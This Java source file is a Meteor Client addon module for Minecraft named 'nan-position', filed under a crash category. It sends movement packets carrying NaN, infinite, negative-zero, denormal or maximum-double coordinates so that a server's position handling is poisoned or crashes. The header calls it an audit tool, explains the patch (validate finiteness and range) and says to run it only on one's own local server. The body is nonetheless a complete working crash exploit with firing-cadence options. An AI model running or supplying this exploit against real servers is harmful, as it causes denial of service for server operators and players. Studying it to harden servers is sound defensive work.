package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

/**
 * AUDIT: NaN Position (IEEE-754 special-value coordinate injection)
 *
 * Sends PlayerMoveC2SPacket.Full with NaN, +Infinity, or −Infinity in the
 * X/Y/Z fields. These are valid IEEE-754 double values that the Java deserialiser
 * will happily read, but they propagate catastrophically through arithmetic:
 *   NaN + anything = NaN   (poisons entity position forever)
 *   Infinity * 0 = NaN
 *   Infinity < bound = false (bypasses range checks that use </>)
 *
 * A server that stores a NaN position can then crash on every subsequent
 * distance/bounds calculation involving that player until a restart.
 *
 * The NAN_Y_ONLY mode sends real X/Z with NaN Y — a subtler probe that may
 * pass coarse XZ-range checks while still poisoning the Y axis.
 *
 * The FINITE_NASTY modes are the depth case (review criterion 1): values that
 * are perfectly finite — so they SAIL THROUGH an isFinite() guard — but still
 * misbehave downstream: negative zero (-0.0, sign-bit games), denormal/subnormal
 * doubles (Double.MIN_VALUE, ~5e-324), and the largest finite double
 * (Double.MAX_VALUE, which overflows to Infinity the moment anything is added).
 * A server that only checks isFinite() is not actually safe.
 *
 * Patch signal: validate finiteness AND range
 * (within world/border bounds, delta within a physics cap) at the first line of
 * the movement handler; treat -0.0, denormals, and near-overflow magnitudes as
 * out-of-range, not merely "finite".
 *
 * Run against your OWN local server only.
 */
public class NanPosition extends Module {
    public enum CoordMode { NAN, POSITIVE_INFINITY, NEGATIVE_INFINITY, NAN_Y_ONLY,
                            NEGATIVE_ZERO, DENORMAL, MAX_DOUBLE }

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<CoordMode> mode = sgGeneral.add(new EnumSetting.Builder<CoordMode>()
        .name("mode").description("Which IEEE-754 value to inject (NaN/Infinity, or a finite-but-nasty value that passes isFinite()).")
        .defaultValue(CoordMode.NAN).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public NanPosition() {
        super(AddonTemplate.CRASH_CATEGORY, "nan-position",
            "Sends NaN/Infinity or finite-but-nasty coordinates. Tests coordinate sanitisation beyond a bare isFinite() check.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!cadence.shouldFire()) return;
        double val = switch (mode.get()) {
            case NAN, NAN_Y_ONLY   -> Double.NaN;
            case POSITIVE_INFINITY -> Double.POSITIVE_INFINITY;
            case NEGATIVE_INFINITY -> Double.NEGATIVE_INFINITY;
            case NEGATIVE_ZERO     -> -0.0;
            case DENORMAL          -> Double.MIN_VALUE;     // ~4.9e-324, smallest subnormal
            case MAX_DOUBLE        -> Double.MAX_VALUE;     // finite, but +anything overflows to Infinity
        };
        double px = mc.player.getX(), pz = mc.player.getZ();
        double sx = (mode.get() == CoordMode.NAN_Y_ONLY) ? px : val;
        double sy = val;
        double sz = (mode.get() == CoordMode.NAN_Y_ONLY) ? pz : val;
        mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(
            sx, sy, sz, mc.player.getYaw(1.0F), mc.player.getPitch(1.0F), false, false));
        packetsSent++;
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
